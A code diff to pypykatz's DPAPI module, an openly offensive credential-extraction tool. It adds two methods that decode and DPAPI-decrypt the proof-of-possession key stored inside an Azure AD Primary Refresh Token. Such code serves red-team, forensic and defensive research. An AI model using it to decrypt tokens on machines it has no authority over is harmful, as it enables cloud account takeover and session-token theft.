@@ -28,7 +28,7 @@ from pypykatz.dpapi.structures.vault import VAULT_VCRD, VAULT_VPOL, VAULT_VPOL_K
 from unicrypto.hashlib import md4 as MD4
 from unicrypto.symmetric import AES, MODE_GCM, MODE_CBC
 from winacl.dtyp.wcee.pvkfile import PVKFile
-from pypykatz.commons.common import UniversalEncoder
+from pypykatz.commons.common import UniversalEncoder, base64_decode_url
 
 
 from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
@@ -851,6 +851,21 @@ class DPAPI:
 			"Store raw": "firefox-default", #"firefox-default",
 			"First Party Domain": "", #""
 		}
+	
+	def decrypt_cloudap_key(self, keyvalue_url_b64):
+		keyvalue = base64_decode_url(keyvalue_url_b64, bytes_expected=True)
+		keyvalue = keyvalue[8:] # skip the first 8 bytes
+		key_blob = DPAPI_BLOB.from_bytes(keyvalue)
+		return self.decrypt_blob(key_blob)
+	
+	def decrypt_cloudapkd_prt(self, PRT):
+		prt_json = json.loads(PRT)
+		keyvalue = prt_json.get('ProofOfPossesionKey',{}).get('KeyValue')
+		if keyvalue is None:
+			raise Exception('KeyValue not found in PRT')
+
+		keyvalue_dec = self.decrypt_cloudap_key(keyvalue)
+		return keyvalue_dec
 
 
 
